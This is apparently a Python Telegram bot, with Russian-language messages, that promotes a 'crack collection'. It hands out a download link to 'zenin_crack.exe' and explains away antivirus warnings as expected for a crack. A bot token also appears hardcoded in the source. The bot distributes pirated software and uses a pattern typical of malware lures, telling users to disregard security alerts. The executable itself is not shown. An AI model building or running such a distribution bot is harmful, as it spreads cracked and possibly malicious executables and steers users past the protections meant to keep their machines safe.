import os
import threading
import time
from flask import Flask
import telebot
from telebot import types

TOKEN = "8294974465:AAFfeR0krjHmDUwdQm7rO5N6VfnV8ZvFrOI"  # ЗАМЕНИТЕ НА СВОЙ ТОКЕН
SOFT_LINK = "https://www.mediafire.com/file/aulm7t7mu6388sc/zenin_crack.exe/file"
IMAGE_URL = "https://i.ibb.co/vxLfXLY4/gg.png"

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

user_last_use = {}

def check_cooldown(user_id):
    current_time = time.time()
    if user_id in user_last_use:
        time_passed = current_time - user_last_use[user_id]
        if time_passed < 5:
            return int(5 - time_passed)
    return 0

def update_cooldown(user_id):
    user_last_use[user_id] = time.time()

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    remaining = check_cooldown(user_id)
    
    if remaining > 0:
        bot.send_message(message.chat.id, f"⏳ Подожди {remaining} секунд!")
        return
    
    update_cooldown(user_id)
    
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    button1 = types.InlineKeyboardButton("📥 Скачать софт", callback_data="download")
    button2 = types.InlineKeyboardButton("🎯 Подробнее", callback_data="more")
    keyboard.add(button1, button2)
    
    bot.send_message(message.chat.id, "Crack Sbornik - 💥 лучший сборник кряков именно для тебя!", reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: True)
def callback(call):
    user_id = call.from_user.id
    remaining = check_cooldown(user_id)
    
    if remaining > 0:
        bot.answer_callback_query(call.id, f"⏳ Подожди {remaining} сек!", show_alert=False)
        return
    
    update_cooldown(user_id)
    
    if call.data == "download":
        bot.send_message(call.message.chat.id, f"🔗 Ссылка:\n{SOFT_LINK}")
    elif call.data == "more":
        bot.send_photo(call.message.chat.id, IMAGE_URL, caption="☢️ антивирус может ругаться на софт потому что это кряк ☢️")
    
    bot.answer_callback_query(call.id)

@app.route('/')
def index():
    return "Bot is running!"

@app.route('/healthz')
def health():
    return "OK"

def run_bot():
    try:
        # Удаляем webhook перед запуском polling
        bot.remove_webhook()
        time.sleep(1)
        print("✅ Webhook удалён, запускаем polling...")
        bot.infinity_polling()
    except Exception as e:
        print(f"Ошибка: {e}")
        time.sleep(5)
        run_bot()

if __name__ == "__main__":
    # Запускаем бота в отдельном потоке
    bot_thread = threading.Thread(target=run_bot)
    bot_thread.start()
    
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
